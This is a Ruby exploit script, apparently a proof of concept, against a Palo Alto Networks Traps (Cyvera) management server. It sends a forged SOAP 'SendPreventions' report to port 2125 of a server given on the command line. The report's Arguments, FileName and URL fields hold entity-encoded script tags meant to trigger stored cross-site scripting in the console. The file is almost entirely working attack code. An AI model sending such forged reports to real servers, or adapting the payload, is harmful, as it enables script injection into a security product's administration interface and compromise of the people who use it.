#!/usr/bin/ruby
# PA traps fuzzer? :)

require 'net/http'

def usage
	puts "pa_traps.rb <trapserver>"
	exit
end

usage if ARGV.empty?

# get the arguments
traps = {}
traps[:server] = ARGV[0]
traps[:port] = 2125

http_headers = {
	"Content-Type" => "application/soap+xml; charset=utf-8", 
	"Expect" => "100-continue",
	"Connection" => "Keep-Alive"
}

soap_envelope = <<-SOAP
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" 
xmlns:a="http://www.w3.org/2005/08/addressing">
	<s:Header>
		<a:Action 
s:mustUnderstand="1">http://tempuri.org/IClientServices/SendPreventions</a:Action>
		
<a:MessageID>urn:uuid:d1bdb437-ea8e-47e8-8167-6cfd69655f43</a:MessageID>
		<a:ReplyTo>
			
<a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
		</a:ReplyTo>
		<a:To 
s:mustUnderstand="1">http://10.13.6.82:2125/CyveraServer/</a:To>
	</s:Header>
	<s:Body>
		<SendPreventions xmlns="http://tempuri.org/">
			<machine>VMNAME1</machine>
			<preventions 
xmlns:b="http://schemas.datacontract.org/2004/07/Cyvera.Common.Interfaces" 
xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
				<b:PreventionDetails>
					<b:Id>0</b:Id>
					
<b:MachineName>VMNAME1</b:MachineName>
					<b:Message>Exploit attempt was 
prevented by Traps</b:Message>
					
<b:PreventionKey>116215ce-65e2-4b77-b176-6c0279d12c37</b:PreventionKey>
					
<b:ProcessName>Excel.exe</b:ProcessName>
					
<b:Time>2014-10-15T13:18:56</b:Time>
					<b:UserName> DOM\\mhendrickx 
</b:UserName>
					
<b:Arguments>"C:\\Users\\Michael\\fake.exe" 
						
&#0000060;script&#0000062;
							alert("xss");
						
&#0000060;/script&#0000062;
					</b:Arguments>
					
<b:CyveraCode>EXEPROT</b:CyveraCode>
					<b:CyveraInternalCode 
i:nil="true"/>
					
<b:CyveraVersion>3.1.2.1546</b:CyveraVersion>
					<b:FileName>
						
&#0000060;script&#0000062;
							alert("xss");
						
&#0000060;/script&#0000062;
					</b:FileName>
					
<b:PreventionMode>Notify</b:PreventionMode>
					<b:ProcessHash i:nil="true"/>
					
<b:ProcessVersion>1.12.1.0</b:ProcessVersion>
					<b:Sent>false</b:Sent>
					
<b:SentToServerTime>0001-01-01T00:00:00</b:SentToServerTime>
					<b:Source>Unknown</b:Source>
					<b:Status i:nil="true"/>
					<b:URL>
						
&#0000060;script&#0000062;
							alert("xss in 
URL");
						
&#0000060;/script&#0000062;
					</b:URL>
				</b:PreventionDetails>
			</preventions>
		</SendPreventions>
	</s:Body>
</s:Envelope>
SOAP

if traps[:server].empty?
	puts "Need a traps server"
	usage
end

# summary
puts "Testing #{traps[:server]}"

Net::HTTP.start(traps[:server], traps[:port]) do |http|
	r1 = http.request_post('/CyveraServer/', soap_envelope, 
http_headers);
	puts r1
	puts r1.inspect
end

